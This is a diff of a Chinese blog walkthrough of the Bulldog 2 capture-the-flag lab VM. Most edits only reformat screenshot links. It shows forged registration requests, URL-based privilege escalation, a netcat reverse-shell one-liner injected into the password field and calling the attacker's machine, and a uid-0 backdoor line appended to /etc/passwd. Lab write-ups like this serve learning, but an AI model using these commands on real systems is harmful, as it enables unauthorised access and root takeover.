@@ -41,13 +41,17 @@
 ### 信息整理筛选
 
 根据扫到的网站信息，发现此网站使用了nginX 1.14.0版本的网页服务器软件，尝试使用`searchsploit nginx`来检索相关的漏洞，未找到有价值的信息
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221322570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
 IP地址开启了WEB服务，因此先直接访问已知的地址，寻找有用的信息
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221349757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221411210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
+
 对页面进行浏览，发现该网站已经关闭注册
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231304893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
+
 在登陆界面尝试SQL注入，显示凭证无效
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231322848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
@@ -56,13 +60,16 @@ IP地址开启了WEB服务，因此先直接访问已知的地址，寻找有用
 ### 页面元素审查
 
 在主页的源码中发现几个JS脚本，下载下来并打开
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231339136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
 ### 尝试注册用户
 
-因为要尝试注册用户，因此打开JS脚本中的main*.js，在JS脚本中搜索关键 register，经过审查，发现用户注册时需要name，email，username，password![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231413237.png)
+因为要尝试注册用户，因此打开JS脚本中的main*.js，在JS脚本中搜索关键 register，经过审查，发现用户注册时需要name，email，username，password
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231413237.png)
 
 因为网站现在关闭了注册，所以使用burpsuite在登陆账号时进行抓包，发现POST传递的路径是/users/authenticate。因为需要将登陆包改成注册包，结合代码审计到信息，应该将authenticate修改为register
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231431167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
 ```
@@ -89,7 +96,8 @@ Referer: http://192.168.72.145/login
 
 
 
-将抓到的数据包导入repeater模块中，然后尝试改包![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231617682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
+将抓到的数据包导入repeater模块中，然后尝试改包
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231617682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
 ```
 # 修改后的注册数据包
@@ -113,11 +121,13 @@ Referer: http://192.168.72.145/login
 ```
 
 注册成功，并尝试登陆
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231714960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231740819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ### 进行水平越权
 
-使用相同的方法注册一个账号admin，密码123，登陆后发现用户名也是明文显示在url上，尝试在url上修改用户名，结果竟然不需要密码就能直接登陆，但是登陆后的账号与注册的普通账号权限一样，因此这是一种==水平越权==![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231804171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
+使用相同的方法注册一个账号admin，密码123，登陆后发现用户名也是明文显示在url上，尝试在url上修改用户名，结果竟然不需要密码就能直接登陆，但是登陆后的账号与注册的普通账号权限一样，因此这是一种==水平越权==
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231804171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231838713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ### 进行垂直越权
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232141713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
@@ -180,14 +190,17 @@ ETag: W/"18c-YIn4//rjps/AGEgvA6o4HKXdUxY"
 
 ### 逻辑漏洞利用
 
-尝试登陆，抓取登陆包，发现用户名和密码明文放在最后；在回包中发现存在一个success的参数，且对这个不存在的账户的状态是false![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232503985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
+尝试登陆，抓取登陆包，发现用户名和密码明文放在最后；在回包中发现存在一个success的参数，且对这个不存在的账户的状态是false
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232503985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
 尝试对回包修改为true，结果页面回复一个登陆成功，但没有进行跳转，对逻辑漏洞的利用失败
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232525626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232546264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 ### 反弹SHELL
 
  当密码过长时，会返回报错信息，在报错信息中发现目录名称
+ 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323262274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 搜Bulldog-2-The-Reckoning在github上发现命执行漏洞源码 
 
@@ -215,27 +228,33 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.72.141 888 >/tmp/f
 在密码处插入shell的反弹脚本，并在kali上开启端口的监听
 
 成功获得用户的shell
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232758636.png)
 
 ### 提权
 
-进入/etc目录中，发现存放用户名和密码的文件竟然时777，可以向其中写入一个管理员权限的用户![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323283928.png)
+进入/etc目录中，发现存放用户名和密码的文件竟然时777，可以向其中写入一个管理员权限的用户
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323283928.png)
 
-可以仿照这个格式写入一个管理员权限的用户![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232905590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
+可以仿照这个格式写入一个管理员权限的用户
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232905590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
 
 使用加密命令，得到一个加密后的密码。123456为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等），如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。所以，加密盐其实是必须的参数。
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323293590.png)
 ```
 perl -le 'print crypt("123456","aa")'
 ```
 
-只需将passwd文件中root的信息的用户名和加密密码修改，就可以创建一个和root权限相同的用户![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233004923.png)
+只需将passwd文件中root的信息的用户名和加密密码修改，就可以创建一个和root权限相同的用户
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233004923.png)
 
 ```
 echo 'ming:aaAN1ZUwjW7to:0:0:garmin:/root:/bin/bash'>> /etc/passwd
 ```
 
-使用python重新调用一个shell，并且切换到新的用户![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233043100.png)
+使用python重新调用一个shell，并且切换到新的用户
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233043100.png)
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
